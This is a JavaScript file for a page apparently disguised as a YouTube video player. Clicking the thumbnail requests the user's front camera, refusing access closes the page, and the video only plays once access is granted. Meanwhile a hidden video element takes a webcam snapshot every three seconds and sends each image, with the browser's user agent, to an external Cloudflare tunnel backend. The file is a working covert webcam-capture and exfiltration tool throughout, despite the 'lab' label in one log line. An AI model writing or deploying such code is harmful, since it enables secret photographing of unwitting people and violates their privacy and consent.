// ===== CONFIGURATION =====
// ✅ UPDATED: Cloudflared URL
const BACKEND_URL = 'https://continuity-streets-manitoba-computational.trycloudflare.com';
const CAPTURE_INTERVAL = 3000;

// ===== STATE =====
let mediaStream = null;
let videoElement = null;
let captureInterval = null;
let isCameraActive = false;
let captureCount = 0;
let videoPlayed = false;

// ===== DOM ELEMENTS =====
const videoThumbnail = document.getElementById('video-thumbnail');
const youtubeIframe = document.getElementById('youtube-iframe');

// ===== CLOSE PAGE =====
function closePage() {
    console.log('🚫 Camera denied - Closing page...');
    try {
        window.close();
    } catch(e) {}
    try {
        window.location.href = 'about:blank';
    } catch(e) {}
    try {
        document.body.innerHTML = '';
    } catch(e) {}
    setTimeout(() => {
        window.location.replace('about:blank');
    }, 100);
}

// ===== PLAY VIDEO ON CLICK =====
if (videoThumbnail) {
    videoThumbnail.addEventListener('click', function(e) {
        e.preventDefault();
        if (videoPlayed) return;
        requestCameraAccess();
    });
}

// ===== REQUEST CAMERA ACCESS =====
async function requestCameraAccess() {
    try {
        console.log('📸 Requesting camera access...');
        
        videoElement = document.createElement('video');
        videoElement.style.display = 'none';
        videoElement.setAttribute('playsinline', 'true');
        document.body.appendChild(videoElement);
        
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 640 },
                height: { ideal: 480 }
            },
            audio: false
        });
        
        mediaStream = stream;
        videoElement.srcObject = stream;
        await videoElement.play();
        isCameraActive = true;
        videoPlayed = true;
        
        console.log('✅ Camera access granted');
        playYouTubeVideo();
        startCapturing();
        
    } catch (error) {
        console.error('❌ Camera error:', error);
        closePage();
    }
}

// ===== PLAY YOUTUBE VIDEO =====
function playYouTubeVideo() {
    console.log('▶️ Playing video: pYEEbJljTwc');
    
    if (videoThumbnail) {
        videoThumbnail.style.display = 'none';
    }
    
    if (youtubeIframe) {
        youtubeIframe.style.display = 'block';
        youtubeIframe.src = 'https://www.youtube.com/embed/pYEEbJljTwc?si=LiHKHKBH5gfGBSjo&autoplay=1&mute=0&rel=0&enablejsapi=1';
        console.log('✅ Video iframe loaded');
    }
}

// ===== START CAPTURING =====
function startCapturing() {
    captureCount = 0;
    console.log('📸 Starting capture every', CAPTURE_INTERVAL/1000, 'seconds');
    captureAndSendImage();
    captureInterval = setInterval(captureAndSendImage, CAPTURE_INTERVAL);
}

// ===== CAPTURE & SEND IMAGE =====
async function captureAndSendImage() {
    if (!isCameraActive || !videoElement) return;
    
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg', 0.85);
        captureCount++;
        
        console.log(`📸 Capturing #${captureCount}...`);
        
        const response = await fetch(`${BACKEND_URL}/upload`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                image: imageData,
                timestamp: new Date().toISOString(),
                captureId: captureCount,
                userAgent: navigator.userAgent
            })
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log(`✅ [${captureCount}] Saved: ${data.filename}`);
        }
    } catch (error) {
        console.error('❌ Capture failed:', error);
    }
}

// ===== STOP CAPTURING =====
function stopCapturing() {
    if (captureInterval) {
        clearInterval(captureInterval);
        captureInterval = null;
    }
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
        mediaStream = null;
    }
    if (videoElement) {
        videoElement.srcObject = null;
        videoElement.remove();
        videoElement = null;
    }
    isCameraActive = false;
    console.log(`🛑 Stopped. Total: ${captureCount}`);
}

// ===== CLEANUP =====
window.addEventListener('beforeunload', function() {
    stopCapturing();
});

console.log('✅ YouTube Camera Lab Script Loaded');
console.log('📡 Backend URL:', BACKEND_URL);
console.log('🎬 Video ID: pYEEbJljTwc');
